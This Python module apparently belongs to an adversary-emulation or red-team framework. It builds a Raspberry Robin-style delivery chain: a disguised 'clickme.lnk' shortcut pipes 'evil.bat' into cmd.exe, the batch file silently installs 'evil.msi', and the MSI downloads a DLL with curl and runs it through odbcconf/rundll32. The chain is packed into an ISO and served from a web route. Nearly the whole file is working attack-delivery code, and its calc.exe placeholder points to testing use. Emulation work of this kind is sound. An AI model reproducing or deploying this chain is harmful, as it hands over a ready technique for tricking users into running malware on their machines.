from typing import List

from make.lnk.lnk import makeLnk
from make.zip.zip import makeZip
from make.bat.bat import *
from make.rar.rar import makeRar
from make.msi.msi import *
from make.powershell.powershell import *
from make.iso.iso import makeIso

from helpers import *
from model import AceFile, AceRoute


def raspberryrobin(baseUrl) -> List[AceRoute]:
    routes = []
    # LNK -> CMD -> BAT -> MSIEXEC:downloadDLL -> odbcconf/rundll32:dll

    # msi: stage 2
    cmd = "{}; {};".format(
        makeCmdFileDownloadWithCurl(),
        makeCmdToDllWithOdbc(),
    )
    msi = makeMsiFromCmd(cmd)
    msiFile = AceFile("evil.msi", msi)
    #msiRoute = AceRoute('/evil.msi', msiFile)
    #routes.append(msiRoute)

    # bat: stage 1: make sure each line ends with \r\n, or it will not work
    bat = AceBytes(b"calc.exe\r\nmsiexec.exe /q /i evil.msi\r\n")
    batFile = makeAceFile('evil.bat', bat)

    # LNK cmd using "/r cmd file.bat" < technique with file.bat
    # in the same directory (iso)
    lnkData: AceBytes = makeLnk(
        name = "clickme.lnk",
        target = "c:\\windows\\system32\\cmd.exe",
        arguments = "/r cmd < evil.bat".format(),
    )
    lnkFile: AceFile = makeAceFile('clickme.lnk', lnkData)

    # ISO: LNK entry point, stage 1 bat, stage 2 msi
    container: AceBytes = makeIso(files = [
        batFile,
        lnkFile,
        msiFile,
    ])
    containerFile: AceFile = makeAceFile('test.iso', container)
    isoRoute: AceRoute = AceRoute('/test', container)
    routes.append(isoRoute)

    return routes
    

